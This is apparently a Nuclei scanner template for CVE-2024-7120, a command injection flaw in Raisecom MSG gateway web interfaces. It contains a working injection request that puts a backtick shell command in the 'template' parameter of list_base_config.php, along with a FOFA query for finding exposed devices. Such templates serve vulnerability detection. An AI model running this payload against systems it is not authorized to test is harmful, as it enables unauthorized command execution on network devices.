id: CVE-2024-7120

info:
  name: Raisecom MSG1200, MSG2100E, MSG2200 and MSG2300 3.90 - Command Injection
  author: pussycat0x
  severity: medium
  description: |
    A vulnerability, which was classified as critical, was found in Raisecom MSG1200, MSG2100E, MSG2200 and MSG2300 3.90. This affects an unknown part of the file list_base_config.php of the component Web Interface. The manipulation of the argument template leads to os command injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-272451.
  reference:
    - https://netsecfish.notion.site/Command-Injection-Vulnerability-in-RAISECOM-Gateway-Devices-673bc7d2f8db499f9de7182d4706c707?pvs=4
    - https://vuldb.com/?ctiid.272451
    - https://vuldb.com/?id.272451
    - https://vuldb.com/?submit.380167
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 6.3
    cve-id: CVE-2024-7120
    cwe-id: CWE-78
    epss-score: 0.92418
    epss-percentile: 0.9972
  metadata:
    verified: true
    max-request: 2
    fofa-query: '"<TITLE>Web user login</TITLE>" && "<META content\==MSHTML 6.00.2900.5583\" name\=GENERATOR></HEAD>"'
  tags: cve,cve2024,intrusive,raisecom,rce

http:
  - raw:
      - |
        GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo%20-e%20%27{{randstr}}%27%3E%20%2Fwww%2Ftmp%2Finfo.html%60  HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /tmp/info.html HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - "{{randstr}}"

      - type: status
        status:
          - 200
# digest: 4b0a0048304602210095ec3ea22ddc2ef5c32fb02c9e64e78294de57a8be2a914f81a42d2691f0fc6a022100db27f1d4bc568356eb832b0761e531274f66d3498b363bd03d7cb5f37ef20b1d:922c64590222798bb761d5b6d8e72950